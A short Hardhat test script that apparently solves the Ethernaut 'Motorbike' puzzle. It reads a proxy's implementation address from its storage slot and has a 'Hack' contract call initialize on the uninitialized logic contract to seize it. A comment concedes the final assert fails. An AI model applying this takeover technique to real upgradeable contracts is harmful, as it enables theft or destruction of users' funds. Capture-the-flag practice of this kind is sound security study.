const { web3, assert } = require("hardhat");

const MotorBikeFactory = artifacts.require('MotorbikeFactory');
const Motorbike = artifacts.require('Motorbike');
const Hack = artifacts.require('Hack');

contract('Motorbike', (accounts) => {
    let motorbikefactory, motorbike, hack, logic, instaAdd;

    beforeEach(async () => {
        motorbikefactory = await MotorBikeFactory.deployed();
        await motorbikefactory.createInstance(accounts[1]);
        instaAdd = await motorbikefactory.bike.call();
        let storageAd = await web3.eth.getStorageAt(instaAdd, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
        logic = storageAd.replace('000000000000000000000000',  '');
        hack = await Hack.new(logic);
        motorbike = await Motorbike.at(instaAdd);
    })

    it('testing call initalize', async () => {
        await hack.callinitialize();
        //next assert is gucci but won't pass bcs im lazy doin padding slicing of the storage slot value
        assert.equal(await web3.eth.getStorageAt(logic, 0), hack.address);
    })

    
 
})